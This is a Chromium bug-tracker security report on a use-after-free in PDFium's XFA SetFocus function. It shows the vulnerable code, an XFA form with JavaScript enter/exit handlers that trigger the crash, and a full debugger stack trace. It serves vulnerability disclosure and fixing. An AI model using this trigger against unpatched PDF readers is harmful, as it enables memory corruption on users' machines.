# Security: PDFium (XFA) Use-after-free in CXFA_FFDocView::SetFocus

| Field | Value |
|-------|-------|
| **Issue ID** | [40095914](https://issues.chromium.org/issues/40095914) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2019-08-05 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

CXFA\_FFWidget object use-after-free in function CXFA\_FFDocView::SetFocus

**VERSION**  

Operating System: Windows 10 64bit  

Chrome with enabled XFA PDFium

**REPRODUCTION CASE**  

Open file `poc.pdf` in chrome.exe

DETAIL INFORMATION

This issue is related to <https://crbug.com/chromium/948985> (<https://bugs.chromium.org/p/chromium/issues/detail?id=948985>) and a patch <https://pdfium-review.googlesource.com/c/pdfium/+/57110>. The issue is fixed by this patch but it's not complete. There is a way that can be used to trigger another use-after-free bug in this function.

Let's see the patched version of function `CXFA_FFDocView::SetFocus`

```
bool CXFA_FFDocView::SetFocus(CXFA_FFWidget\* pNewFocus) {  
  CXFA_FFWidget\* pOldFocus = m_pFocusWidget.Get();  
  
  if (pOldFocus == pNewFocus)  
    return false;  
  
  if (pOldFocus) {  
    CXFA_ContentLayoutItem\* pItem = pOldFocus->GetLayoutItem();  
    if (pItem->TestStatusBits(XFA_WidgetStatus_Visible) &&  
        !pItem->TestStatusBits(XFA_WidgetStatus_Focused)) {  
      if (!pOldFocus->IsLoaded())  
        pOldFocus->LoadWidget();  
      if (!pOldFocus->OnSetFocus(pOldFocus))  
        pOldFocus = nullptr;  
    }  
  }  
  if (pOldFocus) {  
    if (!pOldFocus->OnKillFocus(pNewFocus))  
      return false;  
  }  
  
  if (pNewFocus) {  
    if (pNewFocus->GetLayoutItem()->TestStatusBits(XFA_WidgetStatus_Visible)) {  
      if (!pNewFocus->IsLoaded())  
        pNewFocus->LoadWidget();  
      if (!pNewFocus->OnSetFocus(pOldFocus))  
        pNewFocus = nullptr;  
    }  
  }  
  if (pNewFocus) {  
    CXFA_Node\* node = pNewFocus->GetNode();  
    m_pFocusNode = node->IsWidgetReady() ? node : nullptr;  
    m_pFocusWidget = pNewFocus;  
  } else {  
    m_pFocusNode = nullptr;  
    m_pFocusWidget = nullptr;  
  }  
  
  return true;  
}  

```

We know that the instruction `pOldFocus->OnSetFocus(pOldFocus)` can trigger JS code in `enter` event of `pOldFocus` widget. In this JS function, we can destroy both `pOldfocus` and `pNewFocus` widget. However in the patch, only `pOldFocus` object is watched whether is destroyed after JS callback function (by checking return value of function `pOldFocus->OnSetFocus`). The `pNewFocus` object is also freed after JS function but it's not checked. This lead to use-after-free issue when this object is used again in instruction `if (pNewFocus->GetLayoutItem()->TestStatusBits(XFA_WidgetStatus_Visible))`

To reach to instruction `if (!pOldFocus->OnSetFocus(pOldFocus))`, we must satify the condition in `if` instruction

```
    if (pItem->TestStatusBits(XFA_WidgetStatus_Visible) &&  
        !pItem->TestStatusBits(XFA_WidgetStatus_Focused))   

```

So the `pOldFocus` object must have `XFA_WidgetStatus_Focused` bit cleared. This `XFA_WidgetStatus_Focused` bit is cleared in function `CXFA_FFWidget::OnKillFocus`

```
bool CXFA_FFWidget::OnKillFocus(CXFA_FFWidget\* pNewWidget) {  
  // OnKillFocus event may remove this widget.  
  ObservedPtr<CXFA_FFWidget> pWatched(this);  
  GetLayoutItem()->ClearStatusBits(XFA_WidgetStatus_Focused);		==> clear bit `XFA_WidgetStatus_Focused`   
  EventKillFocus();													==> can call to JS code!!!  
  if (!pWatched)  
    return false;  
  
  if (!pNewWidget)  
    return true;  
  
  CXFA_FFWidget\* pParent = GetFFWidget(ToContentLayoutItem(GetParent()));  
  if (pParent && !pParent->IsAncestorOf(pNewWidget)) {  
    if (!pParent->OnKillFocus(pNewWidget))  
      return false;  
  }  
  if (!pWatched)  
    return false;  
  
  return true;  
}  

```

And after this bit is cleared, function `EventKillFocus` is called. We can trigger JS code from this function. In JS code, if we can create a JS code that can call function `CXFA_FFDocView::SetFocus` again then we can trigger this bug.

Based on this reasoning, i setup an XML XFA form with a field name `field2` like below

```
<field name="field2" h="10.625mm" w="30.625mm" x="1mm" y="1mm">  
	<ui>  
        <numericEdit>  
        </numericEdit>  
    </ui>  
    <caption>  
        <value>  
            <text>field2</text>  
        </value>  
    </caption>  
	<event activity="exit"><script contentType="application/x-javascript">  
		f2_exit += 1;  
		if (f2_exit == 1)  
		{   
			f3 = xfa.resolveNode("xfa.form..field3");  
			xfa_log_print("xfa.host.setFocus(f3);");  
			xfa.host.setFocus(f3);  
		}  
	</script></event>  
	<event activity="enter"><script contentType="application/x-javascript">  
		f2_enter += 1;  
		if (f2_enter == 1)  
		{   
			f1 = xfa.resolveNode("xfa.form..field1");  
			xfa.host.setFocus(f1);  
			xfa.template.remerge();  
			xfa.host.openList(f1);  
		}      
	</script></event>  
</field>  

```

This field has 2 JS function handler for 2 events: `enter` and `exit`. The JS handler of `exit` event is called when function `EventKillFocus` is called, after the `XFA_WidgetStatus_Focused` bit is cleared. In this handler, if we call `xfa.host.setFocus` one more time then we can re-entry function `CXFA_FFDocView::SetFocus` with widget object has cleared `XFA_WidgetStatus_Focused` bit => this makes we can trigger to vulnerable code. Finally, JS handler of `enter` event (which is triggered when function `pOldFocus->OnSetFocus(pOldFocus)` is called) will delete `pNewFocus` widget object => lead to use-after-free bug in function `CXFA_FFDocView::SetFocus` when it comes back from `enter` event handler.

CRASH INFORMATION

```
(2f4c.55b4): Access violation - code c0000005 (first chance)  
First chance exceptions are reported before any exception handling.  
This exception may be expected and handled.  
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\pdfium.dll  
eax=39d66fb0 ebx=39a04fd8 ecx=39d66fb0 edx=00a40000 esi=0097b21c edi=35db4f98  
eip=2a4731fa esp=0097afa0 ebp=0097afa4 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202  
pdfium!fxcrt::UnownedPtr<CXFA_ContentLayoutItem>::Get+0xa:  
2a4731fa 8b00            mov     eax,dword ptr [eax]  ds:002b:39d66fb0=????????  
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\v8.dll  
  
3:060> kp  
 # ChildEBP RetAddr    
00 0097afa4 2a473194 pdfium!fxcrt::UnownedPtr<CXFA_ContentLayoutItem>::Get(void)+0xa [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\core\fxcrt\unowned_ptr.h @ 91]   
01 0097afb0 2a5d9c1c pdfium!CXFA_FFWidget::GetLayoutItem(void)+0x14 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffwidget.h @ 133]   
02 0097b00c 2a5d8bd5 pdfium!CXFA_FFDocView::SetFocus(class CXFA_FFWidget \* pNewFocus = 0x39d66fa0)+0x12c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 293]   
03 0097b030 2a5e9bfe pdfium!CXFA_FFDocView::SetFocusNode(class CXFA_Node \* node = 0x38264f80)+0x45 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 316]   
04 0097b048 2a590483 pdfium!CXFA_FFNotify::SetFocusWidgetNode(class CXFA_Node \* pNode = 0x38264f80)+0x3e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffnotify.cpp @ 302]   
05 0097b0fc 2a58e35e pdfium!CJX_HostPseudoModel::setFocus(class CFX_V8 \* runtime = 0x35db4f98, class std::__1::vector<v8::Local<v8::Value>,std::__1::allocator<v8::Local<v8::Value> > > \* params = 0x0097b21c { size=1 })+0x373 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cjx_hostpseudomodel.cpp @ 462]   
06 0097b134 2a59d9e3 pdfium!CJX_HostPseudoModel::setFocus_static(class CJX_Object \* node = 0x39a04fd8, class CFX_V8 \* runtime = 0x35db4f98, class std::__1::vector<v8::Local<v8::Value>,std::__1::allocator<v8::Local<v8::Value> > > \* params = 0x0097b21c { size=1 })+0x7e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cjx_hostpseudomodel.h @ 39]   
07 0097b18c 2a54788e pdfium!CJX_Object::RunMethod(class fxcrt::WideString \* func = 0x0097b38c, class std::__1::vector<v8::Local<v8::Value>,std::__1::allocator<v8::Local<v8::Value> > > \* params = 0x0097b21c { size=1 })+0x103 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cjx_object.cpp @ 179]   
08 0097b23c 2a5418c2 pdfium!CFXJSE_Engine::NormalMethodCall(class v8::FunctionCallbackInfo<v8::Value> \* info = 0x0097b3f8, class fxcrt::WideString \* functionName = 0x0097b38c)+0x20e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_engine.cpp @ 459]   
09 0097b3dc 1ab3b0a3 pdfium!`anonymous namespace'::DynPropGetterAdapter_MethodCallback(class v8::FunctionCallbackInfo<v8::Value> \* info = 0x0097b3f8)+0x3c2 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_class.cpp @ 111]   
0a 0097b44c 1ab39bd8 v8!v8::internal::FunctionCallbackArguments::Call(class v8::internal::CallHandlerInfo handler = class v8::internal::CallHandlerInfo)+0x253 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\api\api-arguments-inl.h @ 158]   
0b 0097b4b8 1ab38426 v8!v8::internal::`anonymous namespace'::HandleApiCallHelper<0>(class v8::internal::Isolate \* isolate = <Value unavailable error>, class v8::internal::Handle<v8::internal::HeapObject> function = class v8::internal::Handle<v8::internal::HeapObject>, class v8::internal::Handle<v8::internal::HeapObject> new_target = class v8::internal::Handle<v8::internal::HeapObject>, class v8::internal::Handle<v8::internal::FunctionTemplateInfo> fun_data = class v8::internal::Handle<v8::internal::FunctionTemplateInfo>, class v8::internal::Handle<v8::internal::Object> receiver = class v8::internal::Handle<v8::internal::Object>, class v8::internal::BuiltinArguments args = class v8::internal::BuiltinArguments)+0x308 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\builtins\builtins-api.cc @ 113]   
0c 0097b508 1ab37ff2 v8!v8::internal::Builtin_Impl_HandleApiCall(class v8::internal::BuiltinArguments args = class v8::internal::BuiltinArguments, class v8::internal::Isolate \* isolate = 0x3e34aaf8)+0x166 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\builtins\builtins-api.cc @ 141]   
0d 0097b580 1b8d3ac3 v8!v8::internal::Builtin_HandleApiCall(int args_length = 0n6, unsigned int \* args_object = 0x0097b5b8, class v8::internal::Isolate \* isolate = 0x3e34aaf8)+0x72 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\builtins\builtins-api.cc @ 129]   
0e 0097b59c 1b6c0ddc v8!Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit+0x43  
0f 0097b5dc 1b6ad1fc v8!Builtins_InterpreterEntryTrampoline+0x31c  
10 0097b5f8 1b6c0ddc v8!Builtins_ArgumentsAdaptorTrampoline+0xbc  
11 0097b640 1b6ad1fc v8!Builtins_InterpreterEntryTrampoline+0x31c  
12 0097b65c 1b6b895f v8!Builtins_ArgumentsAdaptorTrampoline+0xbc  
13 0097b674 1b6b877b v8!Builtins_JSEntryTrampoline+0x5f  
14 0097b6a0 1ac697a4 v8!Builtins_JSEntry+0x5b  
15 (Inline) -------- v8!v8::internal::GeneratedCode<unsigned int,unsigned int,unsigned int,unsigned int,unsigned int,int,unsigned int \*\*>::Call+0xf [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\execution\simulator.h @ 138]   
16 0097b75c 1ac68f8e v8!v8::internal::`anonymous namespace'::Invoke(class v8::internal::Isolate \* isolate = <Value unavailable error>, struct v8::internal::`anonymous namespace'::InvokeParams \* params = 0x0097b768)+0x804 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\execution\execution.cc @ 266]   
17 0097b7a0 1aa939fb v8!v8::internal::Execution::Call(class v8::internal::Isolate \* isolate = 0x3e34aaf8, class v8::internal::Handle<v8::internal::Object> callable = class v8::internal::Handle<v8::internal::Object>, class v8::internal::Handle<v8::internal::Object> receiver = class v8::internal::Handle<v8::internal::Object>, int argc = 0n1, class v8::internal::Handle<v8::internal::Object> \* argv = 0x0097bb94)+0x6e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\execution\execution.cc @ 358]   
18 0097b858 2a54411d v8!v8::Function::Call(class v8::Local<v8::Context> context = class v8::Local<v8::Context>, class v8::Local<v8::Value> recv = class v8::Local<v8::Value>, int argc = 0n1, class v8::Local<v8::Value> \* argv = 0x0097bb94)+0x2fb [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\api\api.cc @ 4822]   
19 0097bba8 2a549569 pdfium!CFXJSE_Context::ExecuteScript(char \* szScript = 0x3f74401c ".    f2_exit += 1;.    if (f2_exit == 1).    { .        f3 = xfa.resolveNode("xfa.form..field3");.        xfa_log_print("xfa.host.setFocus(f3);");.        xfa.host.setFocus(f3);.    }.", class CFXJSE_Value \* lpRetValue = 0x3c008ff0, class CFXJSE_Value \* lpNewThisObject = 0x40028ff0)+0xa0d [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_context.cpp @ 300]   
1a 0097bc88 2a67bace pdfium!CFXJSE_Engine::RunScript(CXFA_Script::Type eScriptType = Javascript (0n1), class fxcrt::StringViewTemplate<wchar_t> wsScript = class fxcrt::StringViewTemplate<wchar_t>, class CFXJSE_Value \* hRetValue = 0x3c008ff0, class CXFA_Object \* pThisObject = 0x38224f80)+0x349 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_engine.cpp @ 153]   
1b 0097bd98 2a679992 pdfium!CXFA_Node::ExecuteBoolScript(class CXFA_FFDocView \* pDocView = 0x391c7f60, class CXFA_Script \* script = 0x38260f80, class CXFA_EventParam \* pEventParam = 0x0097beb8)+0x33e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\parser\cxfa_node.cpp @ 2700]   
1c 0097bde0 2a6798e5 pdfium!CXFA_Node::ExecuteScript(class CXFA_FFDocView \* pDocView = 0x391c7f60, class CXFA_Script \* script = 0x38260f80, class CXFA_EventParam \* pEventParam = 0x0097beb8)+0x52 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\parser\cxfa_node.cpp @ 2660]   
1d 0097be14 2a67948f pdfium!CXFA_Node::ProcessEventInternal(class CXFA_FFDocView \* pDocView = 0x391c7f60, XFA_AttributeValue iActivity = Exit (0n98), class CXFA_Event \* event = 0x38250f80, class CXFA_EventParam \* pEventParam = 0x0097beb8)+0xe5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\parser\cxfa_node.cpp @ 2360]   
1e 0097be88 2a602777 pdfium!CXFA_Node::ProcessEvent(class CXFA_FFDocView \* pDocView = 0x391c7f60, XFA_AttributeValue iActivity = Exit (0n98), class CXFA_EventParam \* pEventParam = 0x0097beb8)+0x10f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\parser\cxfa_node.cpp @ 2336]   
1f 0097bef4 2a6025b7 pdfium!CXFA_FFWidget::EventKillFocus(void)+0xb7 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffwidget.cpp @ 650]   
20 0097bf30 2a5ff838 pdfium!CXFA_FFWidget::OnKillFocus(class CXFA_FFWidget \* pNewWidget = 0x39d66fa0)+0x57 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffwidget.cpp @ 424]   
21 0097bf78 2a5d9bf1 pdfium!CXFA_FFTextEdit::OnKillFocus(class CXFA_FFWidget \* pNewWidget = 0x39d66fa0)+0xb8 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_fftextedit.cpp @ 187]   
22 0097bfd4 2a5d8bd5 pdfium!CXFA_FFDocView::SetFocus(class CXFA_FFWidget \* pNewFocus = 0x39d66fa0)+0x101 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 288]   
23 0097bff8 2a5e9bfe pdfium!CXFA_FFDocView::SetFocusNode(class CXFA_Node \* node = 0x38264f80)+0x45 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 316]   
24 0097c010 2a590483 pdfium!CXFA_FFNotify::SetFocusWidgetNode(class CXFA_Node \* pNode = 0x38264f80)+0x3e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffnotify.cpp @ 302]   
25 0097c0c4 2a58e35e pdfium!CJX_HostPseudoModel::setFocus(class CFX_V8 \* runtime = 0x35db4f98, class std::__1::vector<v8::Local<v8::Value>,std::__1::allocator<v8::Local<v8::Value> > > \* params = 0x0097c1e4 { size=1 })+0x373 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cjx_hostpseudomodel.cpp @ 462]   
26 0097c0fc 2a59d9e3 pdfium!CJX_HostPseudoModel::setFocus_static(class CJX_Object \* node = 0x39a04fd8, class CFX_V8 \* runtime = 0x35db4f98, class std::__1::vector<v8::Local<v8::Value>,std::__1::allocator<v8::Local<v8::Value> > > \* params = 0x0097c1e4 { size=1 })+0x7e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cjx_hostpseudomodel.h @ 39]   
27 0097c154 2a54788e pdfium!CJX_Object::RunMethod(class fxcrt::WideString \* func = 0x0097c354, class std::__1::vector<v8::Local<v8::Value>,std::__1::allocator<v8::Local<v8::Value> > > \* params = 0x0097c1e4 { size=1 })+0x103 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cjx_object.cpp @ 179]   
28 0097c204 2a5418c2 pdfium!CFXJSE_Engine::NormalMethodCall(class v8::FunctionCallbackInfo<v8::Value> \* info = 0x0097c3c0, class fxcrt::WideString \* functionName = 0x0097c354)+0x20e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_engine.cpp @ 459]   
29 0097c3a4 1ab3b0a3 pdfium!`anonymous namespace'::DynPropGetterAdapter_MethodCallback(class v8::FunctionCallbackInfo<v8::Value> \* info = 0x0097c3c0)+0x3c2 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_class.cpp @ 111]   
2a 0097c414 1ab39bd8 v8!v8::internal::FunctionCallbackArguments::Call(class v8::internal::CallHandlerInfo handler = class v8::internal::CallHandlerInfo)+0x253 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\api\api-arguments-inl.h @ 158]   
2b 0097c480 1ab38426 v8!v8::internal::`anonymous namespace'::HandleApiCallHelper<0>(class v8::internal::Isolate \* isolate = <Value unavailable error>, class v8::internal::Handle<v8::internal::HeapObject> function = class v8::internal::Handle<v8::internal::HeapObject>, class v8::internal::Handle<v8::internal::HeapObject> new_target = class v8::internal::Handle<v8::internal::HeapObject>, class v8::internal::Handle<v8::internal::FunctionTemplateInfo> fun_data = class v8::internal::Handle<v8::internal::FunctionTemplateInfo>, class v8::internal::Handle<v8::internal::Object> receiver = class v8::internal::Handle<v8::internal::Object>, class v8::internal::BuiltinArguments args = class v8::internal::BuiltinArguments)+0x308 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\builtins\builtins-api.cc @ 113]   
2c 0097c4d0 1ab37ff2 v8!v8::internal::Builtin_Impl_HandleApiCall(class v8::internal::BuiltinArguments args = class v8::internal::BuiltinArguments, class v8::internal::Isolate \* isolate = 0x3e34aaf8)+0x166 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\builtins\builtins-api.cc @ 141]   
2d 0097c548 1b8d3ac3 v8!v8::internal::Builtin_HandleApiCall(int args_length = 0n6, unsigned int \* args_object = 0x0097c580, class v8::internal::Isolate \* isolate = 0x3e34aaf8)+0x72 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\builtins\builtins-api.cc @ 129]   
2e 0097c564 1b6c0ddc v8!Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit+0x43  
2f 0097c5a4 1b6ad1fc v8!Builtins_InterpreterEntryTrampoline+0x31c  
30 0097c5c0 1b6c0ddc v8!Builtins_ArgumentsAdaptorTrampoline+0xbc  
31 0097c608 1b6ad1fc v8!Builtins_InterpreterEntryTrampoline+0x31c  
32 0097c624 1b6b895f v8!Builtins_ArgumentsAdaptorTrampoline+0xbc  
33 0097c63c 1b6b877b v8!Builtins_JSEntryTrampoline+0x5f  
34 0097c668 1ac697a4 v8!Builtins_JSEntry+0x5b  
35 (Inline) -------- v8!v8::internal::GeneratedCode<unsigned int,unsigned int,unsigned int,unsigned int,unsigned int,int,unsigned int \*\*>::Call+0xf [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\execution\simulator.h @ 138]   
36 0097c724 1ac68f8e v8!v8::internal::`anonymous namespace'::Invoke(class v8::internal::Isolate \* isolate = <Value unavailable error>, struct v8::internal::`anonymous namespace'::InvokeParams \* params = 0x0097c730)+0x804 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\execution\execution.cc @ 266]   
37 0097c768 1aa939fb v8!v8::internal::Execution::Call(class v8::internal::Isolate \* isolate = 0x3e34aaf8, class v8::internal::Handle<v8::internal::Object> callable = class v8::internal::Handle<v8::internal::Object>, class v8::internal::Handle<v8::internal::Object> receiver = class v8::internal::Handle<v8::internal::Object>, int argc = 0n1, class v8::internal::Handle<v8::internal::Object> \* argv = 0x0097cb58)+0x6e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\execution\execution.cc @ 358]   
38 0097c81c 2a54411d v8!v8::Function::Call(class v8::Local<v8::Context> context = class v8::Local<v8::Context>, class v8::Local<v8::Value> recv = class v8::Local<v8::Value>, int argc = 0n1, class v8::Local<v8::Value> \* argv = 0x0097cb58)+0x2fb [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\api\api.cc @ 4822]   
39 0097cb6c 2a549569 pdfium!CFXJSE_Context::ExecuteScript(char \* szScript = 0x3f72c01c ".    xfa_log_print("|form1| docReady: BEGIN");..    f2_exit = 0; .    f2_enter = 0;.    .    f2 = xfa.resolveNode("xfa.form..field2");.    xfa_log_print("xfa.host.setFocus(f2);");.    xfa.host.setFocus(f2);..    f3 = xfa.resolveNode("xfa.form..field3");.    xfa_log_print("xfa.host.setFocus(f3);");.    xfa.host.setFocus(f3);.    .    xfa_log_print("|form1| docReady: END")    .", class CFXJSE_Value \* lpRetValue = 0x3a062ff0, class CFXJSE_Value \* lpNewThisObject = 0x384c8ff0)+0xa0d [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_context.cpp @ 300]   
3a 0097cc4c 2a67bace pdfium!CFXJSE_Engine::RunScript(CXFA_Script::Type eScriptType = Javascript (0n1), class fxcrt::StringViewTemplate<wchar_t> wsScript = class fxcrt::StringViewTemplate<wchar_t>, class CFXJSE_Value \* hRetValue = 0x3a062ff0, class CXFA_Object \* pThisObject = 0x418bef80)+0x349 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_engine.cpp @ 153]   
3b 0097cd5c 2a679992 pdfium!CXFA_Node::ExecuteBoolScript(class CXFA_FFDocView \* pDocView = 0x391c7f60, class CXFA_Script \* script = 0x382f2f80, class CXFA_EventParam \* pEventParam = 0x0097ced0)+0x33e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\parser\cxfa_node.cpp @ 2700]   
3c 0097cda4 2a6798e5 pdfium!CXFA_Node::ExecuteScript(class CXFA_FFDocView \* pDocView = 0x391c7f60, class CXFA_Script \* script = 0x382f2f80, class CXFA_EventParam \* pEventParam = 0x0097ced0)+0x52 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\parser\cxfa_node.cpp @ 2660]   
3d 0097cdd8 2a67948f pdfium!CXFA_Node::ProcessEventInternal(class CXFA_FFDocView \* pDocView = 0x391c7f60, XFA_AttributeValue iActivity = DocReady (0n115), class CXFA_Event \* event = 0x382faf80, class CXFA_EventParam \* pEventParam = 0x0097ced0)+0xe5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\parser\cxfa_node.cpp @ 2360]   
3e 0097ce4c 2a5da018 pdfium!CXFA_Node::ProcessEvent(class CXFA_FFDocView \* pDocView = 0x391c7f60, XFA_AttributeValue iActivity = DocReady (0n115), class CXFA_EventParam \* pEventParam = 0x0097ced0)+0x10f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\parser\cxfa_node.cpp @ 2336]   
3f 0097ce80 2a5d815f pdfium!XFA_ProcessEvent(class CXFA_FFDocView \* pDocView = 0x391c7f60, class CXFA_Node \* pNode = 0x418bef80, class CXFA_EventParam \* pParam = 0x0097ced0)+0x1c8 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 365]   
40 0097cf50 2a5d80ab pdfium!CXFA_FFDocView::ExecEventActivityByDeepFirst(class CXFA_Node \* pFormNode = 0x418bef80, XFA_EVENTTYPE eEventType = XFA_EVENT_DocReady (0n3), bool bIsFormReady = false, bool bRecursive = true)+0x28f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 413]   
41 0097d020 2a5d86c3 pdfium!CXFA_FFDocView::ExecEventActivityByDeepFirst(class CXFA_Node \* pFormNode = 0x416ecf80, XFA_EVENTTYPE eEventType = XFA_EVENT_DocReady (0n3), bool bIsFormReady = false, bool bRecursive = true)+0x1db [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 399]   
42 0097d094 2a5bd4c8 pdfium!CXFA_FFDocView::StopLayout(void)+0x1a3 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 131]   
43 0097d0e4 2a46b9c2 pdfium!CPDFXFA_Context::LoadXFADoc(void)+0x1d8 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\fpdfxfa\cpdfxfa_context.cpp @ 131]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\chrome.dll  
44 0097d104 5406dd2e pdfium!FPDF_LoadXFA(struct fpdf_document_t__ \* document = 0x3b23cf90)+0x52 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\fpdf_view.cpp @ 260]   
45 0097d1e0 5405fb2b chrome!chrome_pdf::PDFiumEngine::LoadForm(void)+0x18e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 2503]   
46 0097d358 5406d019 chrome!chrome_pdf::PDFiumEngine::LoadBody(void)+0x19b [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 2469]   
47 0097d3bc 5405f90c chrome!chrome_pdf::PDFiumEngine::ContinueLoadingDocument(class std::__1::basic_string<char,std::__1::char_traits<char>,std::__1::allocator<char> > \* password = 0x0097d3f4 "")+0x189 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 2370]   
